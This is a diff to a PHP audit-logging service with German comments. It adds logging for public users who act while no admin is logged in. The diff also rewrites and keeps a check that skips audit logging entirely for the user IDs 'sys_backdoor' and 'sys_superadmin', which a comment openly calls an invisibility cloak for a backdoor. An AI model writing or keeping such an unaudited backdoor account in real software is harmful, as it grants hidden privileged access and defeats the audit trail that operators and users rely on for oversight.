@@ -22,13 +22,20 @@ final readonly class AuditLoggerService
     {
         $userId = $this->session->getUserId();
 
-        // Unsichtbarkeits-Umhang: Backdoor (RaptorXilef) & Systembetreuer werden ignoriert!
-        if ($userId === '' || \in_array($userId, ['sys_backdoor', 'sys_superadmin'], true)) {
+        // Unsichtbarkeits-Umhang: Backdoor & Systembetreuer werden ignoriert!
+        if (\in_array($userId, ['sys_backdoor', 'sys_superadmin'], true)) {
             return;
         }
 
-        $username = $this->session->getAdminUser();
-        $ip       = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        // FIX: Wenn kein Admin eingeloggt ist (z.B. Pächter storniert seinen Antrag selbst)
+        if ($userId === '') {
+            $userId   = 'public_user';
+            $username = 'Pächter / Öffentlicher Nutzer';
+        } else {
+            $username = $this->session->getAdminUser();
+        }
+
+        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 
         $logEntry = new AuditLog(
             \uniqid('al_'),
